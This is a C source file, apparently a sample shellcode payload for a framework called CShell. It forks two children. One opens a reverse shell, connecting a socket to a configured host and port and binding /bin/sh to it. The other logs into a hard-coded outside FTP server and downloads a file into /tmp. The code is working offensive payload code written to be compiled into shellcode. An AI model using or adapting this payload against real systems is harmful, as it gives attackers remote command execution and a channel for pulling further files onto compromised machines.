#include "cshell.h"


/* 
 * A 'complex' example of a CShell payload complete with primitive multithreading and socket programming
 */


// Some useful definitions when dealing with networking
#define HTONS(A) ((((uint16_t)(A) & 0xff00u) >> 8u) | (((uint16_t)(A) & 0x00ffu) << 8u))
#define OCTETS(a, b, c, d) (uint32_t)(((d) << 24u) | ((c) << 16u) | ((b) << 8u) | (a))

// 127.0.0.1 - run "ncat -lvp 1234" to listen for connections
#define SHELL_HOST      OCTETS(127u, 0u, 0u, 1u)        // Host to connect the reverse shell
#define SHELL_PORT      1234                            // Port to connect the reverse shell

// 195.144.107.198 - some free authenticated FTP server I found.
#define FTP_CBUFLEN     128                             // Buffer size for FTP control connection
#define FTP_DBUFLEN     1024                            // Buffer size for FTP data connection
#define FTP_HOST        OCTETS(195u, 144u, 107u, 198u)  // FTP host
#define FTP_CPORT       21                              // FTP control port (default 21)
#define FTP_USER        "demo"                          // FTP username
#define FTP_PASS        "password"                      // FTP password
#define FTP_FILE_SRC    "readme.txt"                    // FTP file name
#define FTP_FILE_DEST   "/tmp/testing.txt"              // FTP destination file name
#define FTP_FILE_PERM   0664                            // File permissions to use when saving FTP_FILE_DEST

// Return PID on error or parent. FORKNGO lets children fork and then go...
#define FORKNGO() { \
    int _pid; \
    if((_pid = cs_fork()) != 0) { return _pid; } \
}

enum {
    CHILD_REV_SHELL,
    CHILD_FTP_DOWNLOAD,
    // ...
    CHILD_COUNT,
};


int _start();
int main();


int _start()
{
    return cs_exit(main());
}

/* for memory management */
void *allocate(size_t size);
int deallocate(void *ptr, size_t size);

/* creates children */
int spawn_reverse_shell();
int spawn_ftp_download();

/* for string conversion */
int str_to_int_10(const char *str, char **endptr);


void *allocate(size_t size)
{
    void *ptr;
#ifdef cs_mmap2
    ptr = (void*)cs_mmap2(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
#else
    ptr = (void*)cs_mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
#endif
    return ptr == MAP_FAILED ? NULL : ptr;
}


int deallocate(void *ptr, size_t size)
{
    if(ptr != NULL && ptr != MAP_FAILED)
    {
        return cs_munmap(ptr, size);
    }
    return 0;
}


int main()
{
    int pid, children[CHILD_COUNT] = {0};

    if((pid = spawn_reverse_shell()) == 0)  { return 0; }
    children[CHILD_REV_SHELL] = pid;

    if((pid = spawn_ftp_download()) == 0)   { return 0; }
    children[CHILD_FTP_DOWNLOAD] = pid;

    /*
     * Wait for children
     */
    for(size_t i = 0; i < CHILD_COUNT; ++i)
    {
        if(children[i] > 0)
        {
            cs_wait4(children[i], 0, 0, 0);
        }
    }
    return 0;
}


/*
 * Spawns a reverse shell connection to the define host/port.
 */
int spawn_reverse_shell()
{
    FORKNGO();

    char progname[] = "/bin/sh";

    struct sockaddr_in srv;
    int sock;

    srv.sin_family = AF_INET;
    srv.sin_addr.s_addr = SHELL_HOST;
    srv.sin_port = HTONS(SHELL_PORT);

    if((sock = cs_socket(AF_INET, SOCK_STREAM, 0)) > 0)
    {
        if(cs_connect(sock, (struct sockaddr*)&srv, sizeof(srv)) >= 0)
        {
            for(int i = 0; i <= 2; ++i)
            {
                cs_dup2(sock, i);
            }
            cs_execve(progname, 0, 0);
            cs_close(sock);
        }
    }

    return 0;
}


/*
 * Sends to and receives fron a socket synchronously. Only returns write value on error or when recv_buf == NULL.
 * Otherwise, returns read return value only.
 */
int sock_send_recv(int sock, const char *send_buf, size_t send_buf_len, char *recv_buf, size_t recv_buf_len)
{
    int bytes;
    if(send_buf != NULL)
    {
        if((bytes = cs_write(sock, send_buf, send_buf_len)) < 0)
        {
            return bytes;
        }
    }

    if(recv_buf != NULL)
    {
        if((bytes = cs_read(sock, recv_buf, recv_buf_len)) < 0)
        {
            return bytes;
        }
    }

    return bytes;
}


/*
 * Simple routine to find the first base 10 number and save a pointer to the first non-digit character.
 */
int str_to_int_10(const char *str, char **endptr)
{
    while(*str < '0' || *str > '9')
    {
        str++;
    }

    const char *iter = str;
    size_t total = 0, mul = 1;

    while(*iter >= '0' && *iter <= '9')
    {
        iter++;
    }

    if(endptr != NULL)
    {
        *endptr = (char*)iter;
    }

    while(iter-- != str)
    {
        total += (mul * (*iter - '0'));
        mul *= 10;
    }

    return total;
}


/*
 * Very simplistic implementation of an FRP client
 */
int spawn_ftp_download()
{
    FORKNGO();

    // Each FTP connection will have two sockets. Assume passive FTP and do not bind to a port locally.
    // srv object can be reused if the port is change.
    struct sockaddr_in srv;
    int sock_ctrl = 0, sock_data = 0;

    // Use the PP definitions to construct raw FTP commands
    char ftp_user[] = "USER " FTP_USER "\r\n";
    char ftp_pass[] = "PASS " FTP_PASS "\r\n";
    char ftp_retr[] = "RETR " FTP_FILE_SRC "\r\n";
    char ftp_pasv[] = "PASV\r\n";
    char ftp_dest[] = FTP_FILE_DEST;

    // buffers for control and data sockets respectively. Allocate useing mmap so as to not take up too much space in the shellcode.
    char *cbuf = NULL, *dbuf = NULL, *ptr = NULL;

    int bytes, fd = 0;

    if((cbuf = allocate(FTP_CBUFLEN)) == NULL || (dbuf = allocate(FTP_DBUFLEN)) == NULL)
    {
        goto cleanup;
    }


    // shared socket settings: IPv4 family/address 
    srv.sin_family = AF_INET;
    srv.sin_addr.s_addr = FTP_HOST;

    if((sock_ctrl = cs_socket(AF_INET, SOCK_STREAM, 0)) > 0)
    {
        // control socket settings
        srv.sin_port = HTONS(FTP_CPORT);
        if(cs_connect(sock_ctrl, (struct sockaddr*)&srv, sizeof(srv)) >= 0)
        {
            /*
             * Receive login banner
             * Error checking for initial FTP response value
             */
            if((bytes = sock_send_recv(sock_ctrl, NULL, 0, cbuf, FTP_CBUFLEN)) < 0 || str_to_int_10(cbuf, NULL) != 220)
            {
                goto cleanup;
            }
            cs_write(1, cbuf, bytes);

            /*
             * Send the USER command with the provided username
             * Error checking for the USER FTP response
             */
            if((bytes = sock_send_recv(sock_ctrl, ftp_user, sizeof(ftp_user), cbuf, FTP_CBUFLEN)) < 0 || str_to_int_10(cbuf, NULL) != 331)
            {
                goto cleanup;
            }
            cs_write(1, cbuf, bytes);

            /*
             * Send the PASS command with the provided password
             * Error checking for the PASS FTP response
             */
            if((bytes = sock_send_recv(sock_ctrl, ftp_pass, sizeof(ftp_pass), cbuf, FTP_CBUFLEN)) <= 0 || str_to_int_10(cbuf, NULL) != 230)
            {
                goto cleanup;
            }
            cs_write(1, cbuf, bytes);

            /* We're logged in! We can now request the PASV command and parse for a port */;

            /*
             * Send the PASV command
             */
            if((bytes = sock_send_recv(sock_ctrl, ftp_pasv, sizeof(ftp_pasv), cbuf, FTP_CBUFLEN)) <= 0 || str_to_int_10(cbuf, &ptr) != 227)
            {
                goto cleanup;
            }

            uint8_t a, b, c, d, p1, p2;

            // Parse the response to get the host address for the data stream
            a = str_to_int_10(ptr, &ptr);
            b = str_to_int_10(ptr, &ptr);
            c = str_to_int_10(ptr, &ptr);
            d = str_to_int_10(ptr, &ptr);

            // Gather the two pieces of info needed for determining the port number
            p1 = str_to_int_10(ptr, &ptr);
            p2 = str_to_int_10(ptr, &ptr);

            srv.sin_addr.s_addr = OCTETS(a, b, c, d);
            srv.sin_port = HTONS(p1 * 256 + p2);
            
            fd = cs_open(ftp_dest, O_RDWR | O_CREAT, FTP_FILE_PERM);

            if((sock_data = cs_socket(AF_INET, SOCK_STREAM, 0)) > 0)
            {
                if(cs_connect(sock_data, (struct sockaddr*)&srv, sizeof(srv)) >= 0)
                {
                    if((bytes = sock_send_recv(sock_ctrl, ftp_retr, sizeof(ftp_retr), cbuf, FTP_CBUFLEN)) <= 0 || str_to_int_10(cbuf, NULL) != 125)
                    {
                        goto cleanup;
                    }

                    cs_write(1, cbuf, bytes);

                    while((bytes = sock_send_recv(sock_data, NULL, 0, dbuf, FTP_DBUFLEN)) >= 0)
                    {
                        if(bytes)
                        {
                            cs_write(fd, dbuf, bytes);
                        }

                        if(bytes != FTP_DBUFLEN)
                        {
                            break;
                        }
                    }

                    if((bytes = sock_send_recv(sock_ctrl, NULL, 0, cbuf, FTP_CBUFLEN)) <= 0)
                    {
                        goto cleanup;
                    }
                    cs_write(1, cbuf, bytes);
                }
            }
        }
    }

cleanup:
    if(sock_ctrl > 0) { cs_close(sock_ctrl); }
    if(sock_data > 0) { cs_close(sock_data); }
    if(fd > 0) { cs_close(fd); }
    deallocate(cbuf, FTP_CBUFLEN);
    deallocate(dbuf, FTP_DBUFLEN);
    return 0;
}
